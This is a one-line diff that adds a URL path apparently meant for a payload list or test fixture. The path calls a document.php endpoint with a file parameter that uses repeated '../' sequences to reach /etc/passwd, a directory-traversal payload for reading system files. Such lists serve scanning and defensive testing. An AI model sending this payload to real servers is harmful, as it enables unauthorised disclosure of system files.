@@ -1,0 +1,1 @@
+/document.php?modulepart=project&file=../../../../../../../etc/passwd
